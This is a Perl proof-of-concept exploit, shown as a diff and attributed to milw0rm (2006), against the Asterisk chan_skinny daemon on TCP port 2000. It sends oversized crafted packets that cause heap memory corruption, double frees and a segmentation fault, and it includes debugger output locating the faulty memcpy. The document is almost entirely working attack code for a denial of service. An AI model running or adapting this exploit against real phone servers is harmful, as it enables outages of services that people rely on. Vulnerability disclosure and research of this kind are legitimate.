@@ -1,0 +1,30 @@
+#!/usr/bin/perl
+# Beyond Security
+# Copyright Noam Rathaus <noamr@beyondsecurity.com>
+
+#
+# The following proof of concept causes the chan_skippy to crash in different locations and due to
+# memory corruption as well as double free calls, this is based on the finding of
+# Security-Assessment.com, and proves that the vulnerability is indeed exploitable and there...
+#
+
+use IO::Socket;
+use strict;
+
+my $target = "127.0.0.1";
+
+my $remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $target, PeerPort => "2000");
+
+unless ($remote) { die "cannot connect to skinny daemon on $target" }
+
+my $packet = "A"x1000; #Causes *** glibc detected *** malloc(): memory corruption: 0x08175830 ***
+my $packet = "\x30\xE0\x00\x00"."\x00\x00\x00\x00".("A"x1000); # *** glibc detected *** double free or corruption (!prev): 0x08184348 ***
+my $packet = "\xE5\x03\x00\x00".("A"x996); # *** glibc detected *** double free or corruption (out): 0x08171740 ***
+my $packet = "\xF0\xFF\xFF\xFF".("A"x996); # Program received signal SIGSEGV, Segmentation fault.
+#[Switching to Thread -1494127696 (LWP 9909)]
+#0xa76264cb in skinny_session (data=0x8183ee8) at chan_skinny.c:2896
+#2896 memcpy(req, s->inbuf, letohl(*(int*)(s->inbuf))+8);
+
+print $remote $packet;
+
+# milw0rm.com [2006-10-19]
